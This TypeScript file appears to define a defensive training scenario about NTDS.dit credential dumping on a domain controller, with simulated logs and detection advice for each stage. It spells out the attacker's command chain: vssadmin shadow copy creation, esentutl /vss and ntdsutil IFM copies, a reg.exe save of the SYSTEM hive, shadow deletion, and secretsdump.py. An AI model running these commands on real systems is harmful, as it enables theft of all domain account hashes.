import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-ntds-dit-vssadmin-esentutl-extraction',
    title: 'CISA & Microsoft DFIR — Volume Shadow Copy & esentutl.exe NTDS.dit Extraction Forensics',
    category: 'ACTIVE_DIRECTORY',
    mitreId: 'T1003.003',
    description:
      'Grounded in CISA Advisory AA23-075A, Microsoft ESENT Event Logging documentation, and MITRE ATT&CK T1003.003: an adversary with Domain Admin privileges creates a Volume Shadow Copy of C: on a Domain Controller via vssadmin.exe or ntdsutil.exe, copies the locked Active Directory database (C:\\Windows\\NTDS\\ntds.dit) using esentutl.exe /y /vss, and extracts the SYSTEM registry hive for offline password hash cracking.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Compromised Admin Jump Host', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Core DC VLAN Switch (:445)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CORP-DC01 (vssvc & esentutl)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Windows Event & ESENT SIEM', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'NTDS.dit & SYSTEM Hive Store', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Volume Shadow Copy Creation via vssadmin.exe & vssvc.exe (EventID 1 & 7036)',
        narration:
          'Because the Active Directory Extensible Storage Engine database (C:\\Windows\\NTDS\\ntds.dit) is exclusively locked by lsass.exe while the Domain Controller is running, the attacker spawns vssadmin.exe create shadow /for=C: to instruct the Volume Shadow Copy Service (VSS) to snapshot the C: volume into \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Credential Access (T1003.003 - OS Credential Dumping: NTDS)',
        technicalCommands: [
          'vssadmin.exe create shadow /for=C:',
          'sc.exe query vss  # System EventID 7036: Volume Shadow Copy service entered the running state',
          'Shadow Copy Device Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
        ],
        defenseMitigation:
          'Alert on Sysmon EventID 1 / Security EventID 4688 for vssadmin.exe, diskshadow.exe, or wmic shadowcopy call create on Domain Controllers outside scheduled backup windows.',
        logs: [
          {
            id: 'dfir-ntds-1',
            timestamp: '02:11:04.210',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'vssadmin.exe',
            CommandLine: 'vssadmin.exe create shadow /for=C:',
            raw: 'EventID: 1 | Computer: CORP-DC01.corp.local | Image: C:\\Windows\\System32\\vssadmin.exe | CommandLine: vssadmin.exe create shadow /for=C: | ParentImage: C:\\Windows\\System32\\cmd.exe | Correlated System EventID 7036: The Volume Shadow Copy service entered the running state.',
            parsedFields: {
              EventID: '1 (Sysmon) / 7036 (System SCM)',
              Image: 'C:\\Windows\\System32\\vssadmin.exe',
              ShadowVolume: '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
              TargetDatabase: 'C:\\Windows\\NTDS\\ntds.dit',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: ESENT Database Streaming via esentutl.exe /y /vss (Application ESENT EventID 325 & 326)',
        narration:
          'The attacker invokes the signed Microsoft Extensible Storage Engine utility (esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit) or ntdsutil.exe "ac i ntds" "ifm". Even if command-line logs are evaded, the Windows Application log records ESENT EventID 325 (New database created: C:\\Temp\\ntds.dit) and EventID 326/327 (Database engine attached/detached).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.003 - ESENT EventID 325/326 Artifact)',
        technicalCommands: [
          'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit',
          'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\IFM" q q',
          'Application Log Provider: ESENT EventID 325 (New database C:\\Windows\\Temp\\ntds.dit created)',
        ],
        defenseMitigation:
          'Forward Windows Application EventLog Provider="ESENT" (Event IDs 216, 325, 326, 327) to the SIEM and trigger high-priority alerts whenever a path containing ntds.dit is created outside C:\\Windows\\NTDS\\.',
        logs: [
          {
            id: 'dfir-ntds-2',
            timestamp: '02:11:09.840',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 325,
            ProcessName: 'esentutl.exe',
            CommandLine: 'esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit',
            raw: 'LogName: Application | Source: ESENT | EventID: 325 | Level: Information | Description: esentutl (4912,D,0) The database engine created a new database (0, C:\\Windows\\Temp\\ntds.dit). | Correlated ESENT EventID 326: Database engine attached database C:\\Windows\\Temp\\ntds.dit.',
            parsedFields: {
              Provider: 'ESENT (Application Event Log)',
              EventID: '325 (Database Created) / 326 (Database Attached)',
              SourceDatabase: 'C:\\Windows\\NTDS\\ntds.dit',
              StagedDatabasePath: 'C:\\Windows\\Temp\\ntds.dit',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SYSTEM Registry Hive BootKey Extraction (reg.exe save HKLM\\SYSTEM) & Offline SecretsDump',
        narration:
          'Because ntds.dit PekList password hashes are encrypted with the Domain Controller BootKey stored across four scrambled registry keys (JD, Skew1, GBG, Data under HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa), the attacker runs reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv and exfiltrates both files to run Impacket secretsdump.py offline.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1003.002 - Security Account Manager / SYSTEM BootKey)',
        technicalCommands: [
          'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y',
          'vssadmin.exe delete shadows /for=C: /quiet',
          'secretsdump.py -ntds ntds.dit -system sys.hiv LOCAL',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 11 (FileCreate) and EventID 13 (RegistryEvent) alongside command-line invocations of reg.exe save targeting HKLM\\SYSTEM or HKLM\\SAM.',
        logs: [
          {
            id: 'dfir-ntds-3',
            timestamp: '02:11:15.302',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\reg.exe | TargetFilename: C:\\Windows\\Temp\\sys.hiv | Correlated EventID 1: reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv /y | BootKey Classes: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\{JD,Skew1,GBG,Data}',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate) / 4688 (Security)',
              Image: 'C:\\Windows\\System32\\reg.exe',
              TargetFilename: 'C:\\Windows\\Temp\\sys.hiv',
              ForensicImpact: 'Offline decryption of all AD user & krbtgt NTLM/AES keys',
            },
          },
        ],
      },
    ],
  };
